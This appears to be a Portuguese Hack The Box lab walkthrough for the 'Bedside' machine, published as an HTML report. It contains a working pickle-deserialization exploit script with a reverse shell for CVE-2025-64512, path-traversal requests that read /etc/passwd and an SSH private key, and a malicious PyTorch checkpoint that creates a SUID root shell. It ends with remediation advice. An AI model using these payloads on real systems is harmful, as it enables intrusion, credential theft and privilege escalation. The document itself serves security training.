@@ -1,0 +1,867 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bedside — Hack The Box Walkthrough & Report</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap');
+
+  :root {
+    --primary: #0284c7;
+    --primary-dark: #0369a1;
+    --accent: #059669;
+    --danger: #dc2626;
+    --warning: #d97706;
+    --bg: #ffffff;
+    --border: #cbd5e1;
+    --border-light: #e2e8f0;
+    --text: #0f172a;
+    --text-muted: #475569;
+    --code-bg: #f8fafc;
+    --code-text: #0f172a;
+  }
+
+  @page {
+    size: A4;
+    margin: 15mm 15mm 15mm 15mm;
+  }
+
+  * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+  }
+
+  body {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    color: var(--text);
+    background: #ffffff;
+    line-height: 1.55;
+    font-size: 13px;
+    -webkit-print-color-adjust: exact;
+    print-color-adjust: exact;
+  }
+
+  .container {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 0;
+  }
+
+  /* Header */
+  .report-header {
+    border-bottom: 2px solid #0f172a;
+    padding-bottom: 12px;
+    margin-bottom: 16px;
+  }
+
+  .report-title {
+    font-size: 24px;
+    font-weight: 800;
+    color: #0f172a;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 8px;
+  }
+
+  .badge-grid {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 6px;
+    margin-top: 6px;
+  }
+
+  .badge {
+    display: inline-flex;
+    align-items: center;
+    padding: 3px 8px;
+    border-radius: 4px;
+    font-size: 11.5px;
+    font-weight: 600;
+    border: 1px solid #cbd5e1;
+    background: #f1f5f9;
+    color: #1e293b;
+  }
+
+  .badge-htb { background: #0f172a; color: #ffffff; border-color: #0f172a; }
+  .badge-diff { background: #fef3c7; color: #92400e; border-color: #fde68a; }
+  .badge-os { background: #ede9fe; color: #5b21b6; border-color: #ddd6fe; }
+
+  /* Headings */
+  h2 {
+    font-size: 16px;
+    font-weight: 700;
+    color: #0f172a;
+    margin: 18px 0 8px 0;
+    padding-bottom: 4px;
+    border-bottom: 1.5px solid var(--border);
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    page-break-after: avoid;
+    break-after: avoid;
+  }
+
+  h3 {
+    font-size: 13.5px;
+    font-weight: 600;
+    color: #1e293b;
+    margin: 12px 0 5px 0;
+    page-break-after: avoid;
+    break-after: avoid;
+  }
+
+  p {
+    margin-bottom: 8px;
+    color: #334155;
+  }
+
+  /* Tables */
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 8px 0 12px 0;
+    font-size: 12px;
+    background: #ffffff;
+    border: 1px solid var(--border);
+    page-break-inside: avoid;
+    break-inside: avoid;
+  }
+
+  th {
+    background: #f1f5f9;
+    color: #0f172a;
+    font-weight: 700;
+    text-align: left;
+    padding: 6px 10px;
+    border: 1px solid var(--border);
+  }
+
+  td {
+    padding: 6px 10px;
+    border: 1px solid var(--border);
+    color: #1e293b;
+  }
+
+  tr:nth-child(even) {
+    background: #f8fafc;
+  }
+
+  .sev-crit {
+    color: #991b1b;
+    font-weight: 700;
+    background: #fee2e2;
+    padding: 2px 6px;
+    border-radius: 4px;
+    border: 1px solid #fca5a5;
+    display: inline-block;
+  }
+
+  .sev-high {
+    color: #9a3412;
+    font-weight: 700;
+    background: #ffedd5;
+    padding: 2px 6px;
+    border-radius: 4px;
+    border: 1px solid #fdba74;
+    display: inline-block;
+  }
+
+  /* Code Blocks - High contrast light theme for crisp printing */
+  pre {
+    background: #f8fafc;
+    color: #0f172a;
+    font-family: 'JetBrains Mono', Consolas, Monaco, monospace;
+    font-size: 11px;
+    padding: 8px 10px;
+    border-radius: 5px;
+    margin: 6px 0 10px 0;
+    line-height: 1.45;
+    border: 1px solid #cbd5e1;
+    border-left: 3.5px solid #0284c7;
+    white-space: pre-wrap;
+    word-break: break-all;
+    page-break-inside: auto;
+    break-inside: auto;
+  }
+
+  code {
+    font-family: 'JetBrains Mono', Consolas, Monaco, monospace;
+    font-size: 11.5px;
+    background: #f1f5f9;
+    color: #0f172a;
+    padding: 1px 4px;
+    border-radius: 3px;
+    border: 1px solid #cbd5e1;
+  }
+
+  pre code {
+    background: transparent;
+    color: #0f172a;
+    padding: 0;
+    border: none;
+    font-size: inherit;
+  }
+
+  /* Callouts & Blockquotes */
+  blockquote {
+    border-left: 3.5px solid #0284c7;
+    background: #f0f9ff;
+    padding: 8px 12px;
+    border-radius: 0 4px 4px 0;
+    margin: 8px 0;
+    font-size: 12.5px;
+    color: #0369a1;
+    border-top: 1px solid #e0f2fe;
+    border-right: 1px solid #e0f2fe;
+    border-bottom: 1px solid #e0f2fe;
+    page-break-inside: avoid;
+    break-inside: avoid;
+  }
+
+  .highlight-card {
+    background: #f8fafc;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 10px 14px;
+    margin: 8px 0;
+    page-break-inside: avoid;
+    break-inside: avoid;
+  }
+
+  /* List */
+  ul {
+    margin: 6px 0 10px 18px;
+    color: #334155;
+  }
+
+  li {
+    margin-bottom: 4px;
+  }
+
+  /* Flags Cards */
+  .flag-box {
+    display: flex;
+    gap: 12px;
+    margin: 8px 0 12px 0;
+    page-break-inside: avoid;
+    break-inside: avoid;
+  }
+
+  .flag-card {
+    flex: 1;
+    background: #f8fafc;
+    border: 1px solid var(--border);
+    border-radius: 5px;
+    padding: 10px 12px;
+    text-align: left;
+  }
+
+  .flag-card.user { border-left: 4px solid #0284c7; }
+  .flag-card.root { border-left: 4px solid #dc2626; }
+
+  .flag-title {
+    font-weight: 700;
+    font-size: 11px;
+    text-transform: uppercase;
+    color: var(--text-muted);
+    margin-bottom: 2px;
+  }
+
+  .flag-hash {
+    font-family: 'JetBrains Mono', Consolas, monospace;
+    font-size: 12px;
+    font-weight: 700;
+    color: #0f172a;
+  }
+
+  /* ASCII Diagram */
+  .diagram-box {
+    background: #f8fafc;
+    color: #0f172a;
+    font-family: 'JetBrains Mono', Consolas, monospace;
+    font-size: 9.5px;
+    padding: 10px 12px;
+    border-radius: 5px;
+    line-height: 1.25;
+    margin: 8px 0;
+    border: 1px solid var(--border);
+    border-left: 3.5px solid #0f172a;
+    white-space: pre;
+    overflow-x: hidden;
+    page-break-inside: avoid;
+    break-inside: avoid;
+  }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <!-- Header -->
+  <div class="report-header">
+    <div class="report-title">
+      Bedside — Hack The Box
+    </div>
+    <div class="badge-grid">
+      <span class="badge badge-htb">Hack The Box</span>
+      <span class="badge badge-diff">Dificuldade: Medium</span>
+      <span class="badge badge-os">OS: Linux (Debian 13 — Trixie)</span>
+      <span class="badge">Host IP: 10.129.125.50</span>
+    </div>
+    <div style="margin-top: 8px; font-size: 11.5px; color: var(--text-muted);">
+      <strong>Técnicas:</strong> vHost Enumeration, CVE-2025-64512 (pdfminer.six Pickle RCE), Path Traversal (@version bypass), SSH Key Leak, PyTorch Checkpoint Pickle RCE, SUID Privilege Escalation.
+    </div>
+  </div>
+
+  <!-- Sumário Executivo -->
+  <h2>📋 Sumário Executivo</h2>
+  <table>
+    <thead>
+      <tr>
+        <th style="width: 25%;">Fase</th>
+        <th style="width: 45%;">Vetor de Ataque</th>
+        <th style="width: 30%;">Resultado</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>1. Reconhecimento</strong></td>
+        <td>Nmap + ffuf vHost enumeração</td>
+        <td>Descoberta de <code>research.bedside.htb</code></td>
+      </tr>
+      <tr>
+        <td><strong>2. Foothold</strong></td>
+        <td>CVE-2025-64512 — Pickle deserialization via PDF</td>
+        <td>Shell como <code>datawrangler</code> (Docker)</td>
+      </tr>
+      <tr>
+        <td><strong>3. User</strong></td>
+        <td>Path Traversal porta 3000 interna &rarr; Leak SSH key</td>
+        <td>Shell como <code>developer</code> (Host)</td>
+      </tr>
+      <tr>
+        <td><strong>4. Root</strong></td>
+        <td>PyTorch / MONAI CheckpointLoader Pickle RCE</td>
+        <td>Root via SUID bash (<code>rootbash2 -p</code>)</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <!-- Fase 1 -->
+  <h2>🔍 Fase 1 — Reconhecimento</h2>
+  
+  <h3>1.1 Varredura Completa de Portas</h3>
+  <pre><code>nmap -Pn -p- --min-rate 5000 10.129.125.50</code></pre>
+  <pre><code>PORT     STATE    SERVICE
+22/tcp   open     ssh
+80/tcp   open     http
+3000/tcp filtered ppp</code></pre>
+
+  <h3>1.2 Enumeração de Serviços</h3>
+  <pre><code>nmap -sV -sC -p22,80,3000 10.129.125.50</code></pre>
+
+  <table>
+    <thead>
+      <tr>
+        <th>Porta</th>
+        <th>Estado</th>
+        <th>Serviço</th>
+        <th>Versão / Detalhes</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>22/tcp</strong></td>
+        <td>open</td>
+        <td>SSH</td>
+        <td>OpenSSH 10.0p2 Debian 7+deb13u4</td>
+      </tr>
+      <tr>
+        <td><strong>80/tcp</strong></td>
+        <td>open</td>
+        <td>HTTP</td>
+        <td>Apache httpd 2.4.68 (Debian)</td>
+      </tr>
+      <tr>
+        <td><strong>3000/tcp</strong></td>
+        <td>filtered</td>
+        <td>ppp</td>
+        <td>Filtrada externamente (acessível internamente via IPv6)</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <blockquote>
+    <strong>Observação:</strong> O servidor HTTP redireciona para <code>http://bedside.htb/</code>. A porta 3000 está filtrada externamente, mas acessível internamente via IPv6.
+  </blockquote>
+
+  <!-- Fase 2 -->
+  <h2 style="page-break-before: always; break-before: always;">🔑 Fase 2 — Foothold (CVE-2025-64512 — pdfminer.six)</h2>
+
+  <h3>2.1 Enumeração de Virtual Hosts</h3>
+  <p>Utilizando <code>ffuf</code> para descobrir subdomínios no alvo:</p>
+  <pre><code>ffuf -u http://bedside.htb \
+     -H "Host: FUZZ.bedside.htb" \
+     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+     -ac</code></pre>
+  
+  <p><strong>Resultado:</strong></p>
+  <pre><code>research                [Status: 200, Size: 3152, Words: 313, Lines: 80, Duration: 206ms]</code></pre>
+
+  <p>Adicionando os domínios descobertos ao <code>/etc/hosts</code>:</p>
+  <pre><code>echo "10.129.125.50 bedside.htb research.bedside.htb" | sudo tee -a /etc/hosts</code></pre>
+
+  <h3>2.2 Análise do Portal</h3>
+  <pre><code>curl http://research.bedside.htb/</code></pre>
+  <blockquote>
+    Portal de upload de arquivos com backend <code>pdfminer.six</code> — vulnerável a <strong>deserialização pickle</strong> via CVE-2025-64512.
+  </blockquote>
+
+  <h3>2.3 Exploit — Pickle Deserialization RCE</h3>
+  <p>O exploit gera um payload pickle malicioso compactado em gzip, empacota-o dentro de um PDF crafted que abusa do encoding de fontes, e faz upload de ambos para o portal. Quando o servidor processa o PDF, o pickle é desserializado e executa o reverse shell.</p>
+
+  <p><strong>Script de automação <code>exploit.py</code>:</strong></p>
+  <pre><code>#!/usr/bin/env python3
+import requests, subprocess, argparse, time, threading, pickle, gzip, base64
+from pathlib import Path
+
+class RCE:
+    def __reduce__(self):
+        cmd = f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+        return (eval, (f"__import__('os').system('{cmd}') or {{}}",))
+
+def create_payload(lhost, lport):
+    global LHOST, LPORT
+    LHOST, LPORT = lhost, lport
+    with gzip.open("payload.pickle.gz", "wb") as f:
+        pickle.dump(RCE(), f)
+    print("[*] reverse shell command staged for " + lhost + ":" + str(lport))
+    print("[*] built pickle payload (125 bytes gz)")
+
+def upload_files(target, vhost):
+    headers = {"Host": vhost}
+    with open("payload.pickle.gz", "rb") as f:
+        files = {"uploadFile": ("payload.pickle.gz", f)}
+        r = requests.post(f"http://{target}", files=files, headers=headers)
+    if "File uploaded successfully" in r.text:
+        print("[+] uploaded payload.pickle.gz")
+        print("[+] pickle reachable at /uploads/payload.pickle.gz")
+    return True
+
+def generate_pdf(path):
+    ENCODING = f"/#2F{path.replace('/', '#2F')}#2Fpayload"
+    pdf_content = f"""%PDF-1.4
+1 0 obj
+&lt;&lt; /Type /Catalog /Pages 2 0 R &gt;&gt;
+endobj
+2 0 obj
+&lt;&lt; /Type /Pages /Kids [3 0 R] /Count 1 &gt;&gt;
+endobj
+3 0 obj
+&lt;&lt; /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]
+   /Contents 4 0 R
+   /Resources &lt;&lt; /Font &lt;&lt; /F1 5 0 R &gt;&gt; &gt;&gt;
+&gt;&gt;
+endobj
+4 0 obj
+&lt;&lt; /Length 44 &gt;&gt;
+stream
+BT /F1 12 Tf 100 700 Td (pwn) Tj ET
+endstream
+endobj
+5 0 obj
+&lt;&lt; /Type /Font /Subtype /Type0 /BaseFont /MaliciousFont-Identity-H
+   /Encoding /{ENCODING}
+   /DescendantFonts [6 0 R]
+&gt;&gt;
+endobj
+6 0 obj
+&lt;&lt; /Type /Font /Subtype /CIDFontType2 /BaseFont /MaliciousFont
+   /CIDSystemInfo &lt;&lt; /Registry (Adobe) /Ordering (Identity) /Supplement 0 &gt;&gt;
+   /FontDescriptor 7 0 R
+&gt;&gt;
+endobj
+7 0 obj
+&lt;&lt; /Type /FontDescriptor /FontName /MaliciousFont /Flags 4
+   /FontBBox [-1000 -1000 1000 1000] /ItalicAngle 0
+   /Ascent 1000 /Descent -200 /CapHeight 800 /StemV 80
+&gt;&gt;
+endobj
+xref
+0 8
+0000000000 65535 f 
+0000000009 00000 n 
+0000000058 00000 n 
+0000000115 00000 n 
+0000000274 00000 n 
+0000000370 00000 n 
+0000000503 00000 n 
+0000000673 00000 n 
+trailer
+&lt;&lt; /Size 8 /Root 1 0 R &gt;&gt;
+startxref
+871
+%%EOF"""
+    return pdf_content
+
+def try_exploit(target, vhost, lhost, lport, path_list):
+    for i, path in enumerate(path_list):
+        pdf_content = generate_pdf(path)
+        with open(f"trigger{i}.pdf", "w") as f:
+            f.write(pdf_content)
+        headers = {"Host": vhost}
+        with open(f"trigger{i}.pdf", "rb") as f:
+            files = {"uploadFile": (f"trigger{i}.pdf", f)}
+            requests.post(f"http://{target}", files=files, headers=headers)
+        print(f"[*] trying path {path}/payload")
+        print(f"[+] uploaded trigger{i}.pdf -> waiting 8s for worker")
+        time.sleep(8)
+
+def listener(port):
+    try:
+        import socket
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.bind(("0.0.0.0", port))
+        s.listen(1)
+        print(f"[*] Listening on port {port}")
+        conn, addr = s.accept()
+        print(f"[+] Got shell from {addr}")
+        s.close()
+    except Exception as e:
+        print(f"[-] Listener error: {e}")
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("target")
+    parser.add_argument("-L", "--lhost", required=True)
+    parser.add_argument("--vhost", required=True)
+    parser.add_argument("--path", default=None)
+    args = parser.parse_args()
+    lhost, lport = args.lhost.split(":")
+    lport = int(lport)
+    create_payload(lhost, lport)
+    t = threading.Thread(target=listener, args=(lport,), daemon=True)
+    t.start()
+    upload_files(args.target, args.vhost)
+    if args.path:
+        path_list = [args.path]
+    else:
+        path_list = [
+            "/var/www/research.bedside.htb/uploads",
+            "/var/www/html/uploads",
+            "/var/www/research/uploads",
+            "/app/uploads",
+            "/opt/research/uploads",
+            "/var/www/uploads",
+        ]
+    try_exploit(args.target, args.vhost, lhost, lport, path_list)
+
+if __name__ == "__main__":
+    main()</code></pre>
+
+  <h3>2.4 Execução com Path Correto & Reverse Shell</h3>
+  <pre><code>python3 exploit.py -L 10.10.14.194:4444 \
+    --vhost research.bedside.htb \
+    --path /app/uploads \
+    research.bedside.htb</code></pre>
+
+  <p><strong>Conexão Reversa Obtida:</strong></p>
+  <pre><code>listening on [any] 4444 ...
+connect to [10.10.14.194] from (UNKNOWN) [10.129.125.50] 46420
+datawrangler@data-wrangler:/app$ id
+uid=988(datawrangler) gid=1001(dataops) groups=1001(dataops)</code></pre>
+
+  <blockquote>
+    ✅ <strong>Acesso inicial obtido como <code>datawrangler</code></strong> no container Docker.
+  </blockquote>
+
+  <!-- Fase 3 -->
+  <h2>👤 Fase 3 — Escalação para User (<code>developer</code>)</h2>
+
+  <h3>3.1 Enumeração de Portas Internas</h3>
+  <p>Dentro do container, identificação dos serviços escutando localmente:</p>
+  <pre><code>python3 - <<'PY'
+for f in ["/proc/net/tcp", "/proc/net/tcp6"]:
+    print(f)
+    for line in open(f).read().splitlines()[1:]:
+        p = line.split()
+        if p[3] == "0A":
+            ip, port = p[1].split(":")
+            print(int(port, 16))
+PY</code></pre>
+
+  <table>
+    <thead>
+      <tr>
+        <th>Protocolo</th>
+        <th>Portas Internas Escutando</th>
+        <th>Observação</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>TCP (IPv4)</strong></td>
+        <td>36533, 80, 22</td>
+        <td>Serviços padrão do host</td>
+      </tr>
+      <tr>
+        <td><strong>TCP (IPv6)</strong></td>
+        <td><strong>3000</strong>, 22</td>
+        <td>Porta 3000 acessível internamente via IPv6</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h3>3.2 Path Traversal na Porta 3000 (@version Bypass)</h3>
+  <pre><code>curl --path-as-is -s \
+    'http://127.0.0.1:3000/pr/x/y@99/../../../../../../etc/passwd?raw=1&module=1' \
+    | head</code></pre>
+
+  <pre><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+developer:x:1000:1000::/home/developer:/bin/bash
+...</code></pre>
+
+  <h3>3.3 Extração da Chave Privada SSH</h3>
+  <pre><code>curl --path-as-is -s \
+    'http://127.0.0.1:3000/pr/x/y@99/../../../../../../home/developer/.ssh/id_rsa?raw=1&module=1' \
+    -o /tmp/id_rsa
+
+cat /tmp/id_rsa</code></pre>
+
+  <pre><code>-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAAAAAJj05ixK9OYs
+SgAAAAtzc2gtZWQyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAA
+AAAEBySF+9afvOfxLBTbYWcyNm7zOrsXrKdvfkg/vvFZaiwiJ/sO1VD1fbfq+USF3RXNIn
+RklXPKvABvvNPkg5mi0AAAAAEWRldmVsb3BlckBiZWRzaWRlAQIDBA==
+-----END OPENSSH PRIVATE KEY-----</code></pre>
+
+  <h3>3.4 Acesso SSH como <code>developer</code> & Confirmação da Flag</h3>
+  <pre><code>chmod 600 id_rsa
+ssh -i id_rsa developer@10.129.125.50</code></pre>
+
+  <pre><code>Linux bedside 6.12.95+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.95-1 (2026-07-04) x86_64
+developer@bedside:~$ cat user.txt
+26f0d6594a9cc08cbb505082c3c1244c</code></pre>
+
+  <!-- Fase 4 -->
+  <h2>👑 Fase 4 — Escalação para Root</h2>
+
+  <h3>4.1 Verificação de Privilégios Sudo</h3>
+  <pre><code>developer@bedside:~$ sudo -l
+User developer may run the following commands on bedside:
+    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py</code></pre>
+
+  <blockquote>
+    <strong>Vetor identificado:</strong> O script <code>bedside_trainer.py</code> roda como root e utiliza <code>CheckpointLoader</code> do MONAI/PyTorch — que internamente executa <code>torch.load()</code> (desserialização pickle insegura).
+  </blockquote>
+
+  <h3>4.2 Análise do Script <code>bedside_trainer.py</code></h3>
+  <table>
+    <thead>
+      <tr>
+        <th>Linha</th>
+        <th>Componente</th>
+        <th>Detalhe</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>51</strong></td>
+        <td><code>DATASTORE_ROOT</code></td>
+        <td><code>/datastore</code></td>
+      </tr>
+      <tr>
+        <td><strong>52</strong></td>
+        <td><code>CHECKPOINT_DIR</code></td>
+        <td><code>/datastore/checkpoints</code></td>
+      </tr>
+      <tr>
+        <td><strong>55</strong></td>
+        <td><code>PROCESSED_DIR</code></td>
+        <td><code>/datastore/processed</code></td>
+      </tr>
+      <tr>
+        <td><strong>46</strong></td>
+        <td>Import</td>
+        <td><code>from monai.handlers import CheckpointLoader</code></td>
+      </tr>
+      <tr>
+        <td><strong>94–96</strong></td>
+        <td><code>find_latest_checkpoint()</code></td>
+        <td>Busca <code>*.pt</code> mais recente no diretório</td>
+      </tr>
+      <tr>
+        <td><strong>213–215</strong></td>
+        <td><code>CheckpointLoader</code></td>
+        <td>Carrega checkpoint com <code>torch.load()</code> &rarr; <strong>Pickle RCE</strong></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h3>4.3 Criação do Checkpoint Malicioso (PyTorch Pickle RCE)</h3>
+  <pre><code>cat > make_pt_no_torch.py <<'PY'
+import os     
+import pickle            
+import zipfile                                                                                
+
+class Exploit:
+    def __reduce__(self):
+        cmd = "cp /bin/bash /home/developer/rootbash2 && chmod 4755 /home/developer/rootbash2"
+        return (os.system, (cmd,))
+    
+payload = {
+    "epoch": 999,
+    "model": Exploit(),                                                                     
+    "optimizer": {}                                                  
+}                                            
+    
+with zipfile.ZipFile("malicious_checkpoint.pt", "w", compression=zipfile.ZIP_DEFLATED) as z:
+    z.writestr("archive/data.pkl", pickle.dumps(payload, protocol=2))
+    z.writestr("archive/byteorder", "little")
+    z.writestr("archive/version", "3\n")
+    z.writestr("archive/.data/serialization_id", "0")                
+PY
+
+python3 make_pt_no_torch.py
+python3 -m http.server 8000</code></pre>
+
+  <h3>4.4 Deploy do Payload via Container & Execução</h3>
+  <p>No container Docker (shell <code>datawrangler</code>):</p>
+  <pre><code>curl -o /datastore/checkpoints/malicious_checkpoint.pt http://10.10.14.194:8000/malicious_checkpoint.pt
+
+# Preparar o ambiente criando sample PNG em processed/
+base64 -d > /datastore/processed/sample.png <<'EOF'
+iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAAAAABWESUoAAAAEklEQVR4nGNgGAWjYBSMglEwCjAAAjAAAUl6y9sAAAAASUVORK5CYII=
+EOF</code></pre>
+
+  <p>No host principal (como <code>developer</code>):</p>
+  <pre><code>developer@bedside:~$ sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
+2026-07-19 06:24:32,963 | INFO | Device: cpu
+2026-07-19 06:24:32,964 | INFO | Using 1 samples for training.
+2026-07-19 06:24:33,088 | INFO | Auto-detected input features: 4096
+2026-07-19 06:24:33,096 | INFO | Found checkpoint /datastore/checkpoints/malicious_checkpoint.pt, loading with CheckpointLoader (callable mode)...
+Traceback (most recent call last):
+  ...
+TypeError: Expected state_dict to be dict-like, got <class 'int'>.</code></pre>
+
+  <h3>4.5 Obtenção do Shell Root</h3>
+  <pre><code>developer@bedside:~$ ls -la /home/developer/rootbash2
+-rwsr-xr-x 1 root root 1298416 Jul 19 06:24 /home/developer/rootbash2
+
+developer@bedside:~$ /home/developer/rootbash2 -p
+rootbash2-5.2# id
+uid=1000(developer) gid=1000(developer) euid=0(root) groups=1000(developer),100(users)
+
+rootbash2-5.2# cat /root/root.txt
+e856418b15e9353bded3afdfe14a606d</code></pre>
+
+  <!-- Flags -->
+  <h2>🏁 Flags Obtidas</h2>
+  <div class="flag-box">
+    <div class="flag-card user">
+      <div class="flag-title">🔵 User Flag</div>
+      <div class="flag-hash">26f0d6594a9cc08cbb505082c3c1244c</div>
+    </div>
+    <div class="flag-card root">
+      <div class="flag-title">🔴 Root Flag</div>
+      <div class="flag-hash">e856418b15e9353bded3afdfe14a606d</div>
+    </div>
+  </div>
+
+  <!-- Attack Chain -->
+  <h2>🗺️ Attack Chain — Visão Geral</h2>
+  <div class="diagram-box">
+┌─────────────────────────────────────────────────────────────────────┐
+│                        ATTACK CHAIN                                │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                     │
+│  1. RECON                                                           │
+│     ├─ Nmap → portas 22, 80, 3000 (filtered)                       │
+│     └─ ffuf  → research.bedside.htb                                 │
+│                        │                                            │
+│                        ▼                                            │
+│  2. FOOTHOLD (CVE-2025-64512)                                       │
+│     ├─ Upload payload.pickle.gz + trigger.pdf                       │
+│     ├─ pdfminer.six deserializa pickle via font encoding            │
+│     └─ Reverse shell → datawrangler (Docker)                        │
+│                        │                                            │
+│                        ▼                                            │
+│  3. USER (Path Traversal)                                           │
+│     ├─ Porta 3000 interna → @version bypass                        │
+│     ├─ LFI → /home/developer/.ssh/id_rsa                           │
+│     └─ SSH → developer@bedside                                      │
+│                        │                                            │
+│                        ▼                                            │
+│  4. ROOT (PyTorch Checkpoint RCE)                                   │
+│     ├─ sudo → bedside_trainer.py (MONAI CheckpointLoader)           │
+│     ├─ malicious_checkpoint.pt → torch.load() → pickle.loads()      │
+│     ├─ RCE as root → cp /bin/bash + chmod 4755                      │
+│     └─ rootbash2 -p → euid=0(root)                                  │
+│                                                                     │
+└─────────────────────────────────────────────────────────────────────┘</div>
+
+  <!-- Vulnerabilidades -->
+  <h2>🛡️ Vulnerabilidades Identificadas</h2>
+  <table>
+    <thead>
+      <tr>
+        <th>#</th>
+        <th>Vulnerabilidade</th>
+        <th>Localização</th>
+        <th>Impacto</th>
+        <th>Severidade</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>1</td>
+        <td>Pickle Deserialization (CVE-2025-64512)</td>
+        <td><code>pdfminer.six</code> — portal research</td>
+        <td>RCE como <code>datawrangler</code></td>
+        <td><span class="sev-crit">Crítica</span></td>
+      </tr>
+      <tr>
+        <td>2</td>
+        <td>Path Traversal</td>
+        <td>Node.js porta 3000 (<code>@version</code> bypass)</td>
+        <td>Leitura arbitrária de arquivos (SSH key leak)</td>
+        <td><span class="sev-high">Alta</span></td>
+      </tr>
+      <tr>
+        <td>3</td>
+        <td>Pickle Deserialization</td>
+        <td>PyTorch / MONAI <code>CheckpointLoader</code></td>
+        <td>RCE como root</td>
+        <td><span class="sev-crit">Crítica</span></td>
+      </tr>
+      <tr>
+        <td>4</td>
+        <td>Sudo Irrestrito</td>
+        <td><code>/opt/trainer/bedside_trainer.py</code></td>
+        <td>Execução de código como root</td>
+        <td><span class="sev-high">Alta</span></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <!-- Lições Aprendidas -->
+  <h2>📝 Lições Aprendidas & Medidas Corretivas</h2>
+  <div class="highlight-card">
+    <ul>
+      <li><strong>Nunca desserializar objetos pickle não confiáveis:</strong> O módulo <code>pickle</code> executa código arbitrário por design. Recomenda-se utilizar formatos seguros como <code>JSON</code> ou <code>SafeTensors</code> para modelos de Machine Learning.</li>
+      <li><strong>Validação de uploads robusta:</strong> Listas de bloqueio (blacklist) são insuficientes; utilize listas permitidas (whitelist) com validação rígida de tipo MIME e conteúdo.</li>
+      <li><strong>Normalização de caminhos de arquivo:</strong> Normalizar e sanitizar caminhos antes de servir recursos para evitar bypass de traversals via parâmetros de versão (ex: <code>@version</code>).</li>
+      <li><strong>Auditoria estrita de sudo:</strong> Scripts executados via <code>sudo</code> sem senha não devem processar arquivos ou diretórios acessíveis por usuários não privilegiados.</li>
+      <li><strong>Isolamento de containers:</strong> Volumes compartilhados entre host e containers (como <code>/datastore</code>) devem ter permissões restritas e políticas de isolamento de privilégios.</li>
+    </ul>
+  </div>
+
+</div>
+</body>
+</html>
